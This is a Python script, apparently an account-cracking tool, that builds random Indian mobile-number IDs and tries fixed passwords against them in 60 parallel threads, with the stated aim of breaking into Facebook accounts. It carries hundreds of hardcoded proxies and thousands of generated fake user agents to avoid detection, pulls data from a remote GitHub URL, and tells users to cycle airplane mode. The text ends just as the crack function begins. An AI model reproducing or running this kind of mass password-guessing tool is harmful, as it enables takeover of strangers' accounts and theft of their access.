import os,time
os.system('clear')
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('INSTALLING MISSING LIBRARY')
        os.system('pip install requests futures==2 > /dev/null')
except:pass
print("JOIN WHATSAPP GROUP")
time.sleep(0.009)
os.system("xdg-open https://chat.whatsapp.com/JVdgO1PPRaaFIQD0imvRqC")
#-------------------[-----]------------------#
user=[]
ok=[]
cp=[]
loop=0
redmi=[]
ugen=[]
models=[]
#-----------------[------]--------------------#
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
proxy = ['139.171.162.10:5520', '45.228.45.147:35010', '27.42.168.46:61308', '184.178.172.18:15280', '36.91.203.231:5678', '49.156.38.126:5678', '58.34.34.186:10800', '192.111.135.18:18301', '224.213.166.123:2313', '139.144.149.248:10006', '200.71.97.1:80', '72.195.34.60:27391', '103.172.24.131:5678', '72.210.221.197:4145', '120.79.31.133:8083', '192.111.137.34:18765', '36.92.9.76:49420', '103.165.22.246:5678', '46.101.163.117:31078', '212.79.108.234:8080', '184.178.172.5:15303', '123.57.1.78:111', '205.240.77.164:4145', '181.229.38.117:5678', '177.36.185.180:5678', '192.158.15.201:50877', '198.89.91.42:5678', '103.161.68.12:1080', '85.113.7.142:5678', '103.4.145.132:1080', '68.183.182.238:57923', '201.234.24.1:4153', '184.181.217.210:4145', '72.221.196.157:35904', '167.86.92.99:30543', '89.58.45.94:43952', '45.234.100.102:1080', '98.162.25.23:4145', '138.68.109.12:29542', '91.121.163.199:63056', '103.12.246.53:4145', '36.89.85.249:5678', '159.203.30.119:16884', '176.123.218.161:18080', '66.42.224.229:41679', '46.98.191.58:5678', '190.4.49.122:35010', '47.92.248.86:5678', '181.113.17.134:43443', '138.68.109.12:63245', '105.208.44.53:5678', '170.84.83.54:5678', '74.119.147.209:4145', '125.70.227.214:10800', '103.105.40.17:4145', '203.205.29.108:5678', '104.248.158.27:25100', '186.189.66.18:4153', '177.93.77.10:4153', '50.235.92.65:32100', '98.188.47.150:4145', '184.178.172.23:4145', '199.102.107.145:4145', '50.255.17.229:32100', '119.235.50.5:4145', '139.255.193.243:7623', '167.71.218.223:26108', '109.75.42.82:3629', '37.57.56.38:5678', '45.190.141.193:1080', '190.210.127.143:65407', '72.37.216.68:4145', '209.13.96.171:39921', '72.195.34.35:27360', '112.221.131.146:5678', '178.249.218.34:5678', '50.236.148.254:31699', '184.178.172.25:15291', '201.236.203.180:4153', '182.23.49.147:4153', '85.172.66.254:1099', '15.168.62.236:33080', '93.190.138.45:41487', '197.157.254.34:4145', '185.170.233.109:47574', '192.111.139.162:4145', '186.159.3.193:45524', '189.195.176.99:5678', '192.252.209.155:14455', '203.154.232.25:4153', '36.255.184.22:5678', '199.229.254.129:4145', '213.208.146.80:5678', '178.48.68.61:4145', '143.137.116.72:1080', '218.21.78.35:4145', '142.54.231.38:4145', '139.224.56.162:9992', '147.139.164.26:7302', '36.88.62.175:7511', '139.224.56.162:999', '49.231.0.178:55860', '104.37.135.145:4145', '159.69.153.169:5566', '199.102.104.70:4145', '68.71.254.6:4145', '117.4.107.199:51796', '98.175.31.195:4145', '123.57.1.78:8888', '181.115.238.186:1080', '213.32.252.134:5678', '14.0.43.193:8449', '88.102.184.156:4153', '138.118.38.2:1080', '102.217.205.117:5678', '182.161.226.15:23658', '190.2.146.108:22690', '103.221.254.59:1088', '185.43.189.182:3629', '90.188.40.61:3629', '202.40.177.186:1088', '39.104.79.145:8088', '199.58.184.97:4145', '45.60.197.203:8148', '200.115.157.211:4145', '131.221.120.196:5678', '121.37.207.154:10000', '213.14.32.70:4153', '45.128.133.209:1080', '58.215.218.170:10800', '139.224.56.162:8082', '178.158.237.68:5678', '69.61.200.104:36181', '143.202.226.13:4145', '51.83.98.190:38593', '115.127.121.198:5678', '104.200.152.30:4145', '159.89.206.6:14601', '218.93.238.185:10800', '61.191.119.134:10800', '36.95.66.243:35010', '184.170.245.148:4145', '115.243.111.42:1088', '91.211.177.245:3629', '109.122.81.1:57553', '98.188.47.132:4145', '139.196.151.191:5001', '174.64.199.79:4145', '103.87.86.146:4153', '184.181.217.206:4145', '217.66.206.156:5678', '72.221.172.203:4145', '118.40.69.218:8899', '186.87.179.54:5678', '1.9.167.36:60489', '183.194.93.138:51080', '187.243.253.238:43015', '47.252.1.180:8999', '92.241.87.14:5678', '192.252.208.70:14282', '46.148.36.47:4153', '136.17.139.223:4915', '190.151.166.15:4153', '138.68.109.12:16386', '186.97.167.26:5678', '72.195.34.42:4145', '199.102.106.94:4145', '47.252.1.180:8499', '5.135.1.146:1981', '82.200.81.5:1080', '98.162.25.7:31653', '178.35.177.242:3629', '154.113.71.102:35010', '188.190.176.114:5678', '107.181.161.81:4145', '138.68.109.12:63428', '207.180.204.70:65432', '173.236.179.119:14694', '177.10.150.3:4145', '5.58.33.187:5678', '47.109.53.253:87', '138.68.109.12:31806', '138.68.109.12:7077', '45.137.64.33:19099', '195.219.98.27:5678', '27.70.161.22:20173', '198.23.143.4:1081', '176.119.141.236:1080', '47.109.53.253:10000', '179.40.75.1:61362', '142.54.236.97:4145', '184.178.172.26:4145', '103.254.167.130:1080', '173.212.245.45:16673', '83.168.84.86:4153', '47.245.56.108:18181', '138.68.105.248:2662', '82.79.129.241:80', '8.219.169.172:19', '45.91.93.166:34575', '102.219.33.179:1080', '197.234.58.102:32767', '98.178.72.21:10919', '8.219.169.172:8080', '112.121.152.139:3128', '103.82.11.209:4153', '8.219.169.172:3790', '103.247.23.82:1080', '8.219.169.172:20', '131.221.182.14:4153', '200.46.30.210:4153', '72.195.114.184:4145', '103.210.29.201:31433', '47.92.242.45:3128', '178.150.188.118:1099', '142.54.239.1:4145', '47.250.134.231:10080', '109.236.86.203:37879', '180.191.22.50:4153', '46.40.60.108:52088', '41.139.250.223:5678', '47.92.242.45:443', '47.250.135.8:10080', '139.196.151.191:50001', '98.170.57.231:4145', '198.8.94.170:4145', '176.118.52.129:3629', '187.252.154.90:4153', '157.245.1.59:15674', '114.108.177.104:60984', '197.159.130.134:5678', '167.71.241.136:33299', '103.93.177.228:5678', '162.19.137.78:34297', '37.26.136.224:4153', '184.178.172.28:15294', '109.236.86.66:48471', '191.7.213.71:31576', '159.138.252.45:8181', '176.114.244.102:33722', '49.0.250.196:9002', '138.255.240.66:40736', '171.226.94.233:20167', '159.89.228.253:38172', '65.21.149.198:8080', '173.212.237.43:33657', '81.7.86.154:4145', '47.92.242.45:9999', '184.181.217.194:4145', '45.60.197.203:4520', '173.212.245.45:14364', '159.65.225.229:49772', '159.138.252.45:5566', '47.243.58.145:5555', '46.101.218.52:58704', '125.141.139.197:5566', '80.191.40.41:5678', '190.119.167.11:5678', '68.71.247.130:4145', '176.117.175.40:5678', '189.91.85.133:31337', '49.0.250.196:502', '73.185.216.244:80', '184.185.2.12:4145', '105.214.2.80:5678', '49.0.250.196:999', '161.35.25.221:3295', '122.9.131.161:8011', '199.102.105.242:4145', '122.9.131.161:3333', '163.53.186.250:5678', '191.37.68.142:32627', '117.186.40.30:1080', '159.138.252.45:6789', '142.54.228.193:4145', '46.23.141.142:5678', '103.224.54.225:31433', '188.164.222.147:1080', '24.234.142.122:31008', '8.213.129.15:999', '173.249.33.122:54853', '170.79.182.82:11337', '47.92.239.69:3128', '70.80.75.236:5678', '183.164.243.149:8089', '174.77.111.197:4145', '199.58.185.9:4145', '103.233.152.180:1080', '80.78.234.31:1080', '202.21.115.94:44574', '103.127.204.109:25327', '184.178.172.17:4145', '91.93.64.227:4145', '47.253.214.60:2080', '202.40.188.92:55103', '158.140.190.211:5678', '198.199.101.121:2327', '167.99.182.125:14475', '98.162.25.16:4145', '80.80.164.164:10801', '103.144.18.202:1080', '138.68.109.12:18395', '116.63.130.30:58208', '144.76.99.207:16003', '108.175.24.1:13135', '51.75.126.150:37198', '192.111.135.17:18302', '27.115.33.94:4153', '134.209.154.177:49425', '47.253.214.60:8989', '51.38.71.114:58083', '45.132.75.19:16863', '181.13.198.90:4153', '159.89.29.73:8080', '177.93.76.6:4145', '192.111.139.165:4145', '39.104.57.170:9002', '72.210.208.101:4145', '8.213.129.15:8989', '181.129.70.82:44357', '192.111.134.10:4145', '192.141.236.10:5678', '116.118.98.5:5678', '103.102.26.1:7469', '72.206.181.97:64943', '47.252.27.174:3128', '76.81.6.107:31008', '195.114.9.184:34445', '121.200.60.122:4153', '138.68.109.12:22412', '118.137.56.108:1080', '184.178.172.11:4145', '82.103.118.42:1099', '184.181.217.213:4145', '202.166.206.59:5678', '103.94.1.98:1080', '173.236.172.4:49631', '8.213.129.15:8089', '173.212.219.197:26877', '212.83.143.60:20733', '138.68.109.12:20535', '186.103.143.213:4153', '192.111.130.2:4145', '89.19.175.117:4145', '103.160.17.38:5678', '5.135.1.146:21287', '202.46.91.218:12391', '210.86.173.42:4153', '192.252.208.67:14287', '121.33.161.113:4145', '185.95.199.103:1099', '103.70.159.149:5678', '222.165.234.242:41541', '98.170.57.249:4145', '103.111.53.82:58033', '117.92.125.24:8089', '177.188.138.11:3128', '72.206.181.103:4145', '188.166.234.144:14605', '72.195.34.41:4145', '117.74.65.29:1111', '117.74.65.29:16072', '197.232.47.122:5678', '98.162.25.29:31679', '206.42.33.45:1080', '197.232.43.224:1080', '103.17.90.6:5678', '138.68.109.12:15866', '117.74.65.29:5566', '121.139.218.165:43295', '117.74.65.29:7788', '181.209.106.187:1080', '103.127.23.10:5678', '190.120.250.31:4145', '124.107.36.198:5678', '72.221.232.152:4145', '138.117.141.27:8888', '117.74.65.29:10005', '131.161.68.41:35944', '168.228.36.22:35010', '213.145.137.102:37447', '186.115.219.59:4153', '117.74.65.29:4063', '64.90.53.25:54049', '63.151.9.74:64312', '206.189.85.33:10198', '139.255.97.156:14888', '95.188.82.147:3629', '170.244.0.179:4145', '142.44.165.103:27982', '98.162.96.52:4145', '138.68.109.12:62662', '170.246.84.89:35010', '192.111.129.145:16894', '190.145.37.5:65409', '185.139.56.133:4145', '14.161.14.106:5678', '72.195.34.58:4145', '98.181.137.83:4145', '103.127.204.117:27217', '82.147.123.185:10808', '117.74.65.29:10000', '80.92.227.185:5678', '147.139.164.26:8080', '187.19.150.221:80', '103.114.96.93:1080', '192.111.139.163:19404', '190.211.161.212:32410', '154.94.0.133:5678', '72.217.216.239:4145', '23.88.121.205:16586', '175.139.179.65:41527', '122.248.38.4:4153', '134.119.189.9:14339', '197.248.28.17:10801', '65.20.222.175:35010', '192.252.220.89:4145', '72.210.252.134:46164', '46.105.105.223:19963', '192.111.137.35:4145', '159.203.63.113:50720', '45.128.135.253:1080', '200.27.110.30:57702', '142.54.229.249:4145', '27.70.165.109:20173', '74.119.144.60:4145', '103.120.38.238:5678', '184.181.217.220:4145', '103.37.82.134:39873', '31.172.133.253:4153', '154.79.248.156:5678', '8.209.243.173:8888', '190.89.89.157:4153', '89.28.32.203:57391', '51.222.108.216:25018', '190.182.88.226:52339', '101.51.121.141:4153', '54.39.46.139:44918', '45.91.93.166:17657', '103.127.63.57:5678', '46.98.192.233:5678', '41.223.65.158:4153', '202.40.177.94:5678', '206.42.38.85:1080', '162.212.174.239:80', '138.197.66.68:42588', '45.60.197.203:8907', '95.31.5.29:51528', '36.67.63.239:38071', '138.68.109.12:47831', '131.196.180.1:4153', '195.69.135.19:5678', '68.1.210.163:4145', '95.140.117.10:1080', '109.226.36.78:1080', '217.23.13.32:35479', '179.253.8.244:7777', '14.241.241.185:4145', '162.253.68.97:4145', '45.60.197.203:1187', '184.178.172.3:4145', '5.178.217.227:31019', '103.168.123.92:5678', '39.104.89.111:999', '115.85.84.163:5678', '187.9.76.154:4153', '39.104.89.111:8084', '41.207.251.206:8899', '93.190.143.82:41515', '36.67.14.5:5678', '95.104.160.140:7788', '181.174.85.78:5678', '102.39.113.232:5678', '192.111.130.5:17002', '186.194.234.18:4153', '202.179.184.34:5430', '170.84.83.172:5678', '130.193.123.34:5678', '209.126.127.97:61122', '112.78.138.163:5678', '192.252.211.197:14921', '72.195.114.169:4145', '103.231.176.58:5678', '91.150.77.57:56921', '72.210.221.223:4145', '8.219.167.110:8009', '72.221.171.130:4145', '164.52.42.6:4145', '108.175.23.241:13135', '46.160.90.81:5678', '198.11.175.192:8989', '70.166.167.55:57745', '42.49.148.167:3333', '192.111.138.29:4145', '203.23.49.150:5678', '8.219.167.110:5678', '179.107.52.101:4153', '8.219.167.110:9000', '72.221.164.34:60671', '174.77.111.198:49547', '72.221.171.135:4145', '5.189.129.186:56940', '181.48.70.30:4153', '45.128.133.169:1080', '188.167.178.90:4145', '113.176.195.145:4153', '117.74.65.29:9595', '154.72.78.146:5678', '109.111.242.142:1080', '54.82.101.127:8088', '98.162.25.4:31654', '116.233.95.105:4145', '46.105.105.223:8028', '190.2.136.45:47521', '117.74.65.29:143', '43.248.27.11:54730', '98.162.96.53:10663', '117.74.65.29:4118', '185.164.57.111:7614', '117.74.65.29:2087', '184.178.172.14:4145', '155.254.9.2:36510', '182.16.171.42:51459', '117.74.65.29:5005', '109.166.207.162:3629', '188.64.113.104:1080', '188.75.255.119:35010', '222.165.223.140:41541', '200.116.198.140:37092', '192.252.216.81:4145', '213.6.77.198:5678', '170.246.85.108:37163', '183.88.247.52:4153', '187.19.127.246:8011', '200.41.60.33:4153', '141.94.254.138:49207', '190.12.95.170:37209', '181.115.75.102:5678', '72.206.181.123:4145', '191.36.191.53:5678', '36.64.16.154:35010', '184.105.133.1:48324', '117.74.65.29:646', '104.236.114.255:1611', '81.16.9.222:3629', '188.92.110.174:1080', '46.8.106.140:5500', '92.42.8.20:4145', '200.105.192.6:5678', '95.31.42.199:3629', '186.97.144.98:5678', '94.180.217.100:4145', '27.147.155.70:52596', '165.227.228.102:80', '108.41.35.10:22419', '181.129.74.58:30431', '187.67.26.179:4145', '117.74.65.29:3002', '51.79.248.208:54578', '187.32.20.249:5678', '200.159.146.184:4153', '117.74.65.215:9300', '103.247.22.52:12', '184.181.217.201:4145', '117.74.65.215:6789', '170.80.91.11:4145', '46.188.2.42:5678', '117.74.65.29:9093', '187.103.0.26:5678', '117.74.65.215:33427', '185.89.65.165:33744', '192.252.214.20:15864', '213.74.223.69:4153', '142.54.232.6:4145', '132.148.75.242:47171', '117.74.65.215:10091', '109.238.208.130:4153', '184.170.248.5:4145', '72.210.252.137:4145', '116.118.98.10:5678', '117.74.65.215:3000', '213.186.202.149:5678', '221.4.161.201:51080', '196.29.231.1:4145', '170.246.196.42:4153', '41.169.78.142:57775', '3.39.244.149:33080', '68.71.249.153:48606', '202.40.186.66:1088', '123.56.129.203:8089', '51.255.80.151:42304', '142.229.215.114:3128', '208.102.51.6:58208', '182.253.93.4:4145', '62.112.11.204:12692', '202.124.224.19:80', '46.227.37.21:1088', '134.209.154.177:11639', '159.192.121.240:4145', '138.219.201.242:5678', '174.75.211.222:4145', '140.210.196.193:20000', '117.74.65.215:1604', '79.143.225.152:31270', '103.106.119.146:12391', '177.131.29.209:4153', '109.224.12.170:52015', '98.162.96.41:4145', '117.74.65.215:11443', '81.174.11.159:43516', '200.146.229.129:8291', '177.185.221.57:21776', '14.160.23.139:4145', '94.247.241.70:51006', '117.74.65.29:8110', '213.165.185.211:4153', '138.68.116.249:8017', '107.181.168.145:4145', '177.66.59.130:4153', '98.181.137.80:4145', '213.222.34.200:4145', '72.221.232.155:4145', '204.3.205.243:80', '45.157.126.165:6121', '103.28.23.229:4145', '180.250.190.150:1080', '103.127.204.112:12132', '213.226.11.149:59086', '92.51.78.66:4153', '186.94.29.52:8080', '181.129.62.2:47377', '24.249.199.4:4145', '203.76.112.68:5678', '94.181.33.149:40840', '37.131.165.19:59341', '185.18.72.249:4153', '47.243.124.21:81', '172.106.13.203:56950', '181.143.61.123:4153', '67.201.33.10:25283', '27.118.21.13:5678', '213.74.223.76:4153', '103.139.246.166:5678', '62.122.201.246:50129', '89.38.96.50:48439', '115.127.87.62:1088', '115.127.75.154:1088', '103.93.100.78:32000', '103.48.183.113:4145', '103.138.22.165:32000', '190.119.167.154:5678', '104.200.135.46:4145', '103.91.95.2:32767', '119.46.2.250:4145', '103.134.113.247:32767', '114.103.88.116:8089', '110.44.171.10:57775', '95.170.202.197:58744', '46.172.75.51:5678', '41.58.169.214:5678', '190.186.216.196:5678', '103.235.199.100:25566', '58.143.65.69:22569', '125.126.213.4:38801', '197.234.58.102:57775', '45.117.228.81:4145', '186.145.192.251:5678', '109.94.178.238:3629', '103.250.153.202:41889', '46.105.105.223:45443', '138.122.74.55:57775', '200.60.71.12:46934', '103.167.172.104:57775', '183.111.165.166:14', '159.65.9.135:10277', '146.196.121.29:57775', '47.109.46.223:8090', '117.74.65.29:8012', '142.54.235.9:4145', '107.152.98.5:4145', '103.79.165.164:57775', '193.106.192.50:36387', '154.0.155.205:8080', '202.154.18.115:1080', '177.234.244.170:32213', '72.49.49.11:31034', '45.174.240.94:999', '103.168.233.91:25566', '103.149.104.161:4153', '170.254.148.110:8080', '159.138.255.141:9981', '79.122.244.99:3128', '49.70.89.82:9999', '95.158.174.111:1080', '103.18.232.47:80', '202.57.37.197:35846', '43.229.73.239:41862', '41.190.152.130:4673', '79.173.75.182:3629', '41.57.34.112:1080', '110.78.149.70:4145', '31.131.135.247:4153', '5.133.96.148:4153', '103.152.104.228:1080', '80.250.18.225:25566', '190.114.143.226:8080', '117.198.221.34:4153', '213.145.134.174:3629', '177.38.245.106:55713', '201.184.239.75:5678', '103.230.62.146:12391', '117.74.125.19:1313', '194.85.135.243:4145', '80.254.185.73:1080', '93.104.63.65:80', '165.0.15.182:5678', '91.193.125.123:3629', '117.74.120.61:1313', '177.107.217.112:4145', '24.172.34.114:60133', '41.190.232.36:36926', '117.220.162.33:5621', '95.81.94.254:3128', '197.211.24.206:5678', '103.176.96.116:5678', '91.121.163.199:40148', '94.154.21.65:1080', '102.89.12.203:7599', '119.18.146.139:4153', '209.94.84.65:1080', '117.74.120.121:1133', '47.100.90.127:10443', '103.207.170.131:5678', '180.210.222.233:1080']
and_models=requests.get("https://raw.githubusercontent.com/H4X-GG/SERVER/main/MODELS/models.txt").text.splitlines()
for xx in and_models:
	models.append(xx)
for x in range(5000):
	a="Mozilla/5.0 (Linux; Android"
	b=random.randrange(5,13)
	mod=random.choice(models)
	c=") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
	d=random.randrange(30,999)
	e=random.randrange(3959,5690)
	f=random.randrange(50,299)
	g="Mobile Safari/537.36"
	uak=f"{a} {b}; {mod}{c}{d}.0.{e}.{f} {g}"
	ugen.append(uak)
for x in range(5000):
	_ua1_=f"Mozilla/5.0 (Linux; {str(random.randint(4,13))}.{str(random.randint(1,5))}.{str(random.randint(1,5))}; SM-J500H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(33,199))}.0.{str(random.randint(4000,5900))}.{str(random.randint(40,180))} Mobile Safari/537.36"
	_ua2_=f"NokiaC1-02/2.0 (0{str(random.randint(1,9))}.{str(random.randint(10,90))}) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US; NokiaC1-02) U2/1.0.0 UCBrowser/{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(1,9))}.{str(random.randint(22,300))} U2/1.0.0 Mobile UNTRUSTED/1.0"
	_ua3_=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(1,9))}.{str(random.randint(1,5))}.{str(random.randint(1,5))}; ru-ru; HTC_ChaCha_A810e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
	_ua4_=f"Mozilla/5.0 (Linux; Android {str(random.randint(2,9))}.{str(random.randint(1,5))}.{str(random.randint(1,4))}; Micromax A190 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(20,120))}.0.0.{str(random.randint(40,140))} Mobile Safari/537.36"
	_ua5_=f"Mozilla/5.0 (Linux; Android {str(random.randint(2,9))}.{str(random.randint(1,5))}.{str(random.randint(1,4))}; GS-500 Build/JOP40D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(30,80))}.0.{str(random.randint(1879,2580))}.{str(random.randint(30,90))} Mobile Safari/537.36 OPR/{str(random.randint(10,80))}.0.{str(random.randint(1001,9999))}.{str(random.randint(11111,99999))}"
	_ua6_=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(2,12))}.1.1; en-us; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(random.randint(40,130))}.0.{str(random.randint(3233,4878))}.{str(random.randint(66,99))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(10,90))}.{str(random.randint(2,9))}.{str(random.randint(2,9))}.{str(random.randint(2,9))}"
	_ua7_=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(2,12))}.{str(random.randint(1,5))}.{str(random.randint(0,5))}; en-gb; SD4930UR Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Silk/{str(random.randint(1,9))}.{str(random.randint(20,99))} like Chrome/{str(random.randint(11,99))}.0.{str(random.randint(1200,1999))}.{str(random.randint(99,130))} Mobile Safari/537.36"
	_ua8_=f"Mozilla/5.0 (Linux; U; Android {str(random.randint(4,12))}.1.2; uk-ua; GT-N7000 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
	_ua9_=f"Mozilla/5.0 (Linux; Android {str(random.randint(4,10))}.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/{str(random.randint(10,90))}.0.{str(random.randint(500,1100))}.{str(random.randint(90,170))} Mobile Safari/535.19"
	ua = random.choice([_ua1_,_ua2_,_ua3_,_ua4_,_ua5_,_ua6_,_ua7_,_ua8_,_ua9_])
	ugen.append(ua)





#-----------------------------------------------------------------------------------------------------------



logo=(f"""\033[1;97m
                                         _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ 
 ( R | A | J | P | U | T )
  \_/ \_/ \_/ \_/ \_/ \_/      

\x1b[38;5;46m⋆⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆⋆
\033[1;97m(✓)         SALMAN NOT NAME SALMAN IS BRAND        (✓)
\x1b[38;5;46m⋆⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆⋆
\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m]FACEBOOK     : \x1b[38;5;46mSALMAN RAJPUT
\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m]STATUS       : \x1b[38;5;46mRANDOM MIX PASSWORD
\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m]VERSION      : \x1b[38;5;46mFREE
\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m]COUNTRY      : \x1b[38;5;46mONLY INDIA
\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m]WORKING      : \x1b[38;5;46mDATA+WIFI
\x1b[38;5;46m⋆⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆⋆""")

def clear():
    os.system('clear')
    print(logo)

def line():
    print(50*'\033[38;5;46m-\033[38;5;46')

def _SALMAN_():
    clear()
#    line()
    print('\033[38;5;46m[\033[38;5;46m1\033[38;5;46m]RANDOM UID CRACK')
    print('\033[38;5;46m[\033[38;5;46m2\033[38;5;46m]CONTACT ADMIN')
    print('\033[38;5;46m[\033[38;5;46m3\033[38;5;46m]EXIT')
    line()
    _IN__=input('\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m]INPUT : ')
    if _IN__ in '1':
        _CLONE_IND()
    if _IN__ in '2':
        os.system('xdg-open https://www.facebook.com/AntiVirusAttack')
    if _IN__ in '3':
        exit ()


def _CLONE_IND():
    clear()
    line()
    print('\033[38;5;46mEXP :  +91639 - +91635 - +91789 ')
    line()
    code=input('\033[38;5;46m[√] SIM CODE : ')
    line()
    clear()
    line()
    print('\033[38;5;46mCRACK LIMIT : 3000 - 5000 - 10000 - 15000')
    line()
    limit=int(input('\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m] LIMIT : '))
    for x in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=60) as mehedi:
        clear()
        tl=str(len(user))
        line()
        print(f'\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m] TOTAL ID : {tl}\n\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m] CODE YOU PUT : {code}\n\033[38;5;46m[\033[38;5;46m⋆\033[38;5;46m] USE AIRPLANE MODE AFTER 5 MINUTES')
        line()
        for love in user:
            uid=code+love
            pwx = ['57273200','57575751','59039200']
            mehedi.submit(crack,uid,pwx,tl)
    line()
    print(f' TOTAL OK/CP : \n{str(len(ok))}\n{str(len(cp))}')
    line()






def crack(uid,pwx,tl):
    global ok
    global loop
    try:
        for ps in pwx:
            session=requests.Session()
